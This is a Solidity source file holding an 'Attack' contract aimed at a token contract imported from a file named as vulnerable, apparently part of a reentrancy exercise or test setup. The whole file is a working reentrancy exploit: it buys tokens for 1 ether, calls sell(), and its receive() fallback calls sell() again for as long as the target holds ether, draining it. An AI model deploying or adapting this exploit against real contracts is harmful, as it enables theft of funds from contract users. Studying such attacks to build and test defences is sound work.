// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import {BohdanERC20Token} from "contracts/BohdanERC20Token_vulnerable.sol";

contract Attack {
    BohdanERC20Token public erc20;

    constructor(address _token) {
        erc20 = BohdanERC20Token(_token);
    }

    receive() external payable {
        if (address(erc20).balance > 0) {
            erc20.sell();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Not enough ether");
        erc20.buy{value: 1 ether}();
        erc20.sell();
    }
}
